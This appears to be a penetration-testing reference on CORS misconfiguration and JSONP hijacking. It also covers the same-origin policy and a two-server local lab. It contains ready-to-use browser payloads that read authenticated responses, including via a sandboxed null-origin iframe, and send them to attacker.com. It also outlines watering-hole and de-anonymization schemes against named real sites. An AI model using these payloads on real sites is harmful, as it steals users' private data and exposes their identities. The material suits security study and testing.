# CORS Misconfiguration — Extended Scenarios

> Companion to [SKILL.md](./SKILL.md). Contains JSONP hijacking, same-origin policy deep dive, and real-world exploitation patterns.

---

## 1. JSONP Hijacking — Complete Attack Scenario

### Mechanism

JSONP (JSON with Padding) wraps JSON data in a function call, enabling cross-origin data access via `<script>` tags. If the JSONP endpoint returns sensitive data and doesn't validate the Referer/Origin:

```html
<!-- Attacker's page: -->
<script>
function stolen(data) {
    // data contains victim's sensitive information
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<script src="https://target.com/api/userinfo?callback=stolen"></script>
<!-- Victim's browser sends cookies → authenticated request → JSONP returns stolen({"name":"victim","email":"..."}) -->
```

### Watering Hole Attack via JSONP

```text
1. Attacker compromises or creates a popular website (watering hole)
2. Embeds JSONP requests to target sites:
   <script src="https://social-site.com/api/profile?callback=exfil"></script>
   <script src="https://bank-site.com/api/account?callback=exfil"></script>
3. When victim visits the watering hole:
   → Browser sends authenticated requests to social-site and bank-site
   → JSONP responses contain victim's data
   → exfil() function sends data to attacker
```

### Honeypot De-Anonymization via JSONP

Security teams use JSONP to identify anonymous visitors:

```html
<!-- Honeypot page includes JSONP from social platforms: -->
<script src="https://weibo.com/api/user?callback=identify"></script>
<script src="https://github.com/api/user?callback=identify"></script>
<!-- If visitor is logged in → JSONP returns their profile → de-anonymized -->
```

---

## 2. Same-Origin Policy — Deep Dive

### Definition

Two URLs have the same origin if and only if protocol, hostname, and port all match:

| URL A | URL B | Same Origin? | Reason |
|---|---|---|---|
| `http://a.com/p1` | `http://a.com/p2` | YES | Same protocol, host, port |
| `http://a.com` | `https://a.com` | NO | Different protocol |
| `http://a.com` | `http://b.com` | NO | Different hostname |
| `http://a.com` | `http://a.com:8080` | NO | Different port |
| `http://a.com` | `http://sub.a.com` | NO | Different hostname |

### document.domain Relaxation

Both pages can set `document.domain = "a.com"` to enable cross-subdomain communication:

```javascript
// On sub1.a.com:
document.domain = "a.com";
// On sub2.a.com:
document.domain = "a.com";
// Now they can access each other's DOM
```

**Security risk**: if any subdomain has XSS, it can set `document.domain` and access all other subdomains that do the same.

---

## 3. CORS vs JSONP — Technical Comparison

| Aspect | JSONP | CORS |
|---|---|---|
| Mechanism | `<script>` tag, callback function | `Access-Control-Allow-Origin` header |
| HTTP methods | GET only | Any method (with preflight for non-simple) |
| Data format | Wrapped in function call | Native JSON/XML/etc. |
| Error handling | No (script either loads or fails) | Yes (fetch API catches errors) |
| Security control | Referer/callback validation | Origin header + server whitelist |
| Browser support | All (legacy) | Modern (IE10+) |
| Credential handling | Always sends cookies | Only with `credentials: include` + server allow |

**Migration path**: replace JSONP endpoints with proper CORS configuration.

---

## 4. CORS Exploitation Payloads

### Read Authenticated Data (reflected origin)

```javascript
// If server reflects any Origin in Access-Control-Allow-Origin:
fetch('https://target.com/api/sensitive-data', {
    credentials: 'include'  // sends cookies
})
.then(r => r.json())
.then(data => {
    // Exfiltrate:
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### Null Origin Exploit (sandbox)

```html
<!-- Create null origin via sandboxed iframe: -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/data', {credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://attacker.com/c?d='+btoa(d)));
</script>
"></iframe>
<!-- Origin header sent as: null -->
<!-- If server allows Access-Control-Allow-Origin: null → exploitable -->
```

---

## 5. Dual-Site Attack Lab Pattern

Testing JSONP hijacking or CORS with two local servers:

```text
Server A (target): localhost:8981 — login page, authenticated API with JSONP
Server B (attacker): localhost:8982 — hosts attack page with JSONP/CORS exploit

Attack flow:
1. Victim logs into Server A (gets session cookie)
2. Victim visits Server B (attacker page)
3. Server B's page includes <script src="http://localhost:8981/api/userinfo?callback=steal">
4. Browser sends Server A's cookies → authenticated JSONP response
5. steal() function on Server B captures the data

Note: for non-localhost testing, change the attack page's target URLs accordingly.
```
